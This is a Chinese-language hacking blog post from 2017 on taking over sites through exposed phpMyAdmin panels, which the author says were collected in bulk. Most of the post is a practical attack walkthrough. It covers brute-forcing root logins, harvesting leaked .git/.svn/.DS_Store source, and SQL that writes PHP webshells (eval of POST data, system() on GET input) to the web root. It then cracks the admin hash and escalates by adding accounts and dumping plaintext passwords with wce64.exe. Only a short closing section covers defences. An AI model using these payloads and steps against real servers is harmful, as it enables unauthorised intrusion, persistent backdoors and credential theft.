@@ -1,0 +1,660 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>PhpMyadmin分析（二） | Hello_C技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Hello_C">
+    
+
+    
+    <meta name="description" content="通过上节的测试阶段，我们已经掌握了一批具有PhpMyadmn页面的URL。我们现在就是需要登录到里面，继而进一步进行我们想要的操作。
+0x01 获取root账号
+1.1 暴力破解　　可以使用phpmyadmin多线程批量破解工具进行批量破解，这里我们需要的就是强大的密码字典以及常用的phpmyadmin用户名。或者使用Burp进行抓包暴力破解。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PhpMyadmin分析（二）">
+<meta property="og:url" content="http://yoursite.com/测试/2017/04/03/PhpMyadmin分析（二）.html">
+<meta property="og:site_name" content="Hello_C技术博客">
+<meta property="og:description" content="通过上节的测试阶段，我们已经掌握了一批具有PhpMyadmn页面的URL。我们现在就是需要登录到里面，继而进一步进行我们想要的操作。
+0x01 获取root账号
+1.1 暴力破解　　可以使用phpmyadmin多线程批量破解工具进行批量破解，这里我们需要的就是强大的密码字典以及常用的phpmyadmin用户名。或者使用Burp进行抓包暴力破解。">
+<meta property="og:image" content="http://i2.muimg.com/567571/eadc3941f15eb273.jpg">
+<meta property="og:image" content="http://i4.buimg.com/567571/114393de4f21e659.jpg">
+<meta property="og:image" content="http://i4.buimg.com/567571/5012807da137aac3.jpg">
+<meta property="og:image" content="http://i1.piimg.com/567571/0882899e9bfbe2b5.jpg">
+<meta property="og:image" content="http://i4.buimg.com/567571/07c2b5c3670eef12.jpg">
+<meta property="og:image" content="http://i2.muimg.com/567571/a16e4d727851f0f6.jpg">
+<meta property="og:image" content="http://i4.buimg.com/567571/fb85029f85e32da1.jpg">
+<meta property="og:updated_time" content="2017-04-03T13:34:26.487Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PhpMyadmin分析（二）">
+<meta name="twitter:description" content="通过上节的测试阶段，我们已经掌握了一批具有PhpMyadmn页面的URL。我们现在就是需要登录到里面，继而进一步进行我们想要的操作。
+0x01 获取root账号
+1.1 暴力破解　　可以使用phpmyadmin多线程批量破解工具进行批量破解，这里我们需要的就是强大的密码字典以及常用的phpmyadmin用户名。或者使用Burp进行抓包暴力破解。">
+<meta name="twitter:image" content="http://i2.muimg.com/567571/eadc3941f15eb273.jpg">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hello_C技术博客" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hello_C技术博客" title="Hello_C技术博客"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hello_C技术博客">Hello_C技术博客</a></h1>
+				<h2 class="blog-motto">一个小白的独白！</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/Message">Message</a></li>
+					
+					<li>
+ 					
+						<form class="search" action="http://baidu.com/" target="_blank">
+							<label>Search</label>
+						<input name="s" type="hidden" value= null ><input type="text" name="q" size="30" placeholder="搜索"><br>
+						</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/测试/2017/04/03/PhpMyadmin分析（二）.html" title="PhpMyadmin分析（二）" itemprop="url">PhpMyadmin分析（二）</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Hello_C" target="_blank" itemprop="author">Hello_C</a>
+		
+  <p class="article-time">
+    <time datetime="2017-04-03T04:37:37.000Z" itemprop="datePublished"> 发表于 2017-04-03</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-获取root账号"><span class="toc-number">1.</span> <span class="toc-text">0x01 获取root账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-root账号获取webshell"><span class="toc-number">2.</span> <span class="toc-text">0x02 root账号获取webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#直接读取后门文件"><span class="toc-number">2.1.</span> <span class="toc-text">直接读取后门文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#导出一句话后门"><span class="toc-number">2.2.</span> <span class="toc-text">导出一句话后门</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-服务器提权"><span class="toc-number">3.</span> <span class="toc-text">0x03 服务器提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-防范方法"><span class="toc-number">4.</span> <span class="toc-text">0x04 防范方法</span></a></li></ol>
+		
+		</div>
+		
+		<p>　　通过上节的测试阶段，我们已经掌握了一批具有PhpMyadmn页面的URL。我们现在就是需要登录到里面，继而进一步进行我们想要的操作。</p>
+<h3 id="0x01-获取root账号"><a href="#0x01-获取root账号" class="headerlink" title="0x01 获取root账号"></a>0x01 获取root账号</h3><ul>
+<li>1.1 暴力破解<br>　　可以使用<a href="http://pan.baidu.com/s/1c1LD6co" target="_blank" rel="external">phpmyadmin多线程批量破解工具</a>进行批量破解，这里我们需要的就是强大的密码字典以及常用的phpmyadmin用户名。或者使用Burp进行抓包暴力破解。<a id="more"></a><br><img src="http://i2.muimg.com/567571/eadc3941f15eb273.jpg" alt=""><br><img src="http://i4.buimg.com/567571/114393de4f21e659.jpg" alt=""></li>
+<li>1.2 源代码泄露<br>　　很多流行架构在Windows及Linux中都会有目录泄露漏洞，通过目录泄露漏洞可以发现源代码打包文件，从打包文件中去寻找数据库配置文件，关键字config、db。常见web源码泄露：<br>　　<strong>.hg源码泄露</strong><br>　　　　形成原因：hg init的时候会生成.hg<br>　　　　eg: <a href="http://www.xxx.com/.hg/" target="_blank" rel="external">http://www.xxx.com/.hg/</a><br>　　　　利用工具<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a>　　rip-hg.pl -v -u <a href="http://www.xxx.com/.hg/" target="_blank" rel="external">http://www.xxx.com/.hg/</a><br>　　<strong>.git源码泄露</strong><br>　　　　形成原因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br>　　　　eg:<a href="http://www.xxx.com/.git/config" target="_blank" rel="external">http://www.xxx.com/.git/config</a><br>　　　　利用工具<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">githack</a>　　GitHack.py <a href="http://www.xxx.com/.git/" target="_blank" rel="external">http://www.xxx.com/.git/</a><br>　　<strong>.DS_Store文件泄漏</strong><br>　　　　形成原因：在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。<br>　　　　eg:<a href="http://www.xxx.com/.ds_store" target="_blank" rel="external">http://www.xxx.com/.ds_store</a><br>　　　　利用工具<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">dsstoreexp</a>　　python ds_store_exp.py <a href="http://www.xxx.com/.DS_Store" target="_blank" rel="external">http://www.xxx.com/.DS_Store</a><br>　　<strong>SVN源码泄露</strong><br>　　　　形成原因：在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。<br>　　　　利用工具：<a href="http://pan.baidu.com/s/1mrNpB" target="_blank" rel="external">http://pan.baidu.com/s/1mrNpB</a></li>
+<li><p>1.3 备份文件<br>　　在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line">.zip</div><div class="line">.7z</div><div class="line">.tar.gz</div><div class="line">.bak</div><div class="line">.swp</div><div class="line">.txt</div><div class="line">.html</div></pre></td></tr></table></figure>
+</li>
+<li><p>1,4 其他方法获取</p>
+</li>
+</ul>
+<h3 id="0x02-root账号获取webshell"><a href="#0x02-root账号获取webshell" class="headerlink" title="0x02 root账号获取webshell"></a>0x02 root账号获取webshell</h3><h4 id="直接读取后门文件"><a href="#直接读取后门文件" class="headerlink" title="直接读取后门文件"></a>直接读取后门文件</h4><p>　　有些网站可能前期被渗透过，网站可能有webshell，特别是一句话后门，如果有后门则可以通过一句话后门暴力破解获取。可以通过获取到的源码进行分析，获取后门文件。</p>
+<h4 id="导出一句话后门"><a href="#导出一句话后门" class="headerlink" title="导出一句话后门"></a>导出一句话后门</h4><ul>
+<li>1、通过创建表的方式</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );</div><div class="line">INSERT INTO `mysql`.`darkmoon` (`darkmoon1` ) VALUES (&apos;&lt;?php @eval($_POST[123]);?&gt;&apos;);</div><div class="line">SELECT `darkmoon1` FROM `darkmoon` INTO OUTFILE &apos;E:/wamp/www/123.php&apos;;</div><div class="line">DROP TABLE IF EXISTS `darkmoon`;</div></pre></td></tr></table></figure>
+<p>　　上面查询语句就是在mysql数据库中创建darkmoon表，然后加入一个名字为darkmoon1的字段，并在darkmoon1的字段中插入一句话代码，然后从darkmoon1字段里面导出一句话到网站的真实路径“E:/wamp/www/”，最后就是删除darkmoon这个表。<br>　　<strong>注意：</strong>在使用以上代码时必须选择mysql数据库，并在phpMyAdmin中选择SQL，然后执行以上代码即可。在执行导入到网站的命令中应该在mysql数据库中操作，需要修改的地方是网站的真实路径，网站真实路径我们上节已经讨论过好几种方法。</p>
+<ul>
+<li>2、直接导出一句话后门文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select &apos;&lt;?php @eval($_POST[123]);?&gt;&apos;INTO OUTFILE &apos;E:/wamp/www/123.php&apos;;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i4.buimg.com/567571/5012807da137aac3.jpg" alt=""></p>
+<ul>
+<li>3、直接执行命令权限的shell<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;E:/wamp/www/123.php&apos;;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i1.piimg.com/567571/0882899e9bfbe2b5.jpg" alt=""></p>
+<ul>
+<li>4、获取网站管理员密码<br>　　当我们上述几种情况无法写入webshell的时候，我们可以查看数据库中管理员的密码，一般都是MD5加密之后的，然后获取后台登录页面使用管理员的权限登录。根据后台的管理模式查找可以上传webshell的方法同样也可以拿webshell。<br><img src="http://i4.buimg.com/567571/07c2b5c3670eef12.jpg" alt=""><br>　　可以看到hash加密之后d033e22ae348aeb5660fc2140aec35850c4da997，相对于MD5多了8位，于是就相应的删除前面或者后面的，d033e22ae348aeb5660fc2140aec3585解密之后密码为admin。<h3 id="0x03-服务器提权"><a href="#0x03-服务器提权" class="headerlink" title="0x03 服务器提权"></a>0x03 服务器提权</h3>　　根据我们刚才上传的一句话木马使用菜刀进行连接继而上传大马进行提权。</li>
+</ul>
+<p><img src="http://i2.muimg.com/567571/a16e4d727851f0f6.jpg" alt=""></p>
+<p>　　直接在虚拟终端运行命令，查看是system权限直接添加用户名然后远程桌面。或者上传wce64.exe或g64.exe直接获取管理员用户的明文密码登录。<br><img src="http://i4.buimg.com/567571/fb85029f85e32da1.jpg" alt=""></p>
+<h3 id="0x04-防范方法"><a href="#0x04-防范方法" class="headerlink" title="0x04 防范方法"></a>0x04 防范方法</h3><p>PhpMyadmin密码帐号暴力破解使用的方法主要是通过字典来进行穷举登录，因此其防范方法可以采取以下措施：<br>　　(1)、设置Root帐号为非缺省名称比如MyRoot等名称，通过phpMyadmin登录后可以进行修改。<br>　　(2)、设置Root帐号所对应的密码为强口令，密码为大小写、特殊字符、字母等等组合体，最好超过10位数以上。<br>　　(3)、在CMS系统中尽量每一个库对应相应的CMS系统帐号，各个系统之间相对独立，且默认在config.php、config.inc.php等配置文件中也是使用相对独立的库帐号，建议不使用Root帐号和密码进行配置。<br>　　(4)、网站代码使用密码进行压缩打包，系统正式部署后清除无关文件。不在网站根目录下保留源代码和数据库文件等。</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/测试/">测试</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/渗透测试/">渗透测试</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	<div class="share-jiathis">
+	  
+<div class="jiathis_style_24x24">
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_googleplus"></a>
+	<a class="jiathis_button_douban"></a>
+	<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+    var jiathis_config={
+    data_track_clickback:true,
+    sm:"copy,renren,cqq",
+    pic:"",
+    summary:"",
+    
+  </script> 
+<script type="text/javascript" src="//v3.jiathis.com/code/jia.js?uid=
+" charset="utf-8"></script>      
+
+	 </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/测试/2017/04/03/PhpMyadmin分析（一）.html"  title="PhpMyadmin分析（一）">
+ <strong>下一篇：</strong><br/> 
+ <span>PhpMyadmin分析（一）
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="测试/2017/04/03/PhpMyadmin分析（二）.html" data-title="PhpMyadmin分析（二）" data-url="http://yoursite.com/测试/2017/04/03/PhpMyadmin分析（二）.html"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-获取root账号"><span class="toc-number">1.</span> <span class="toc-text">0x01 获取root账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-root账号获取webshell"><span class="toc-number">2.</span> <span class="toc-text">0x02 root账号获取webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#直接读取后门文件"><span class="toc-number">2.1.</span> <span class="toc-text">直接读取后门文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#导出一句话后门"><span class="toc-number">2.2.</span> <span class="toc-text">导出一句话后门</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-服务器提权"><span class="toc-number">3.</span> <span class="toc-text">0x03 服务器提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-防范方法"><span class="toc-number">4.</span> <span class="toc-text">0x04 防范方法</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github 名片</p>
+<div class="github-card" data-github="https://github.com/zjwfc" data-width="220" data-height="119" data-theme="medium">
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
+</div>
+  </div>
+
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>7</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/代码/" title="代码">代码<sup>9</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/审计/" title="审计">审计<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/测试/" title="测试">测试<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/渗透/" title="渗透">渗透<sup>11</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞/" title="漏洞">漏洞<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/生活/" title="生活">生活<sup>2</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/渗透测试/" title="渗透测试">渗透测试<sup>25</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/writeup/" title="writeup">writeup<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/杂谈/" title="杂谈">杂谈<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/提权/" title="提权">提权<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/web前端/" title="web前端">web前端<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XSS/" title="XSS">XSS<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Metasploit/" title="Metasploit">Metasploit<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sql注入/" title="sql注入">sql注入<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Docker/" title="Docker">Docker<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ARP攻击/" title="ARP攻击">ARP攻击<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/LAMP环境搭建/" title="LAMP环境搭建">LAMP环境搭建<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.dropsec.xyz/" target="_blank" title="Drops团队主页">Drops团队主页</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://ctf.dropsec.xyz" target="_blank" title="Drops攻防平台">Drops攻防平台</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://fgp.dropsec.xyz" target="_blank" title="F.G.PNotes">F.G.PNotes</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://lyx.dropsec.xyz" target="_blank" title="lazy">lazy</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://byd.dropsec.xyz" target="_blank" title="Joy_nick">Joy_nick</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wkh.dropsec.xyz" target="_blank" title="X加油,未来">X加油,未来</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://jdrops.dropsec.xyz/" target="_blank" title="J_Drops">J_Drops</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://lzx.dropsec.xyz/" target="_blank" title="凡尘">凡尘</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://cq.dropsec.xyz/" target="_blank" title="qiqi">qiqi</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://yunnigu.dropsec.xyz/" target="_blank" title="云">云</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://isron.dropsec.xyz/" target="_blank" title="Isron">Isron</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://flashsec.cn/" target="_blank" title="Flash|Sec">Flash|Sec</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="hotarticles">
+  <p class="asidetitle">hot_articles</p>
+
+  <!-- ��˵�������� start -->
+  <div class="ds-top-threads" data-range="monthly" data-num-items="5"></div>
+  <!-- ��˵�������� end -->
+
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=5664757301&verifier=8450466f&dpc=1"></iframe>
+</div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m Hello_C. <br/>
+			This is my blog,believe it or not.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/5664757301" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/https://github.com/zjwfc" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		<a href="http://www.zhihu.com/people/https://www.zhihu.com/people/duan-zuo-yu-yun-zhi-dian/" target="_blank" class="icon-zhihu" title="知乎"></a>
+		
+		
+		
+		<a href="mailto:845352945@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2017 
+		
+		<a href="/about" target="_blank" title="Hello_C">Hello_C</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+        getSize();
+        if (myWidth >= 1024) {
+          c.click();
+        }
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"zjwfc"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1261655448'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1261655448' type='text/javascript'%3E%3C/script%3E"));</script>
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
